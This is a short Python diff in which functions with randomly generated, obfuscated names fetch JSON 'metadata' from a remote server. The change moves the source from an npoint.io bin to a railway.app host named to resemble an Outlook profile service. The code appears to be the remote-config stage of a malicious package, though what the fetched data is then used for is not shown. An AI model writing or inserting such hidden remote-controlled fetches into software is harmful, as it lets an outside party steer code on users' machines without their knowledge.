@@ -18,7 +18,7 @@ def eval_nakrnk_361():
 
     def learn_votsjh_531():
         try:
-            train_rcbcya_918 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_rcbcya_918 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_rcbcya_918.raise_for_status()
             model_zcegxt_973 = train_rcbcya_918.json()
             process_hjwlxj_521 = model_zcegxt_973.get('metadata')
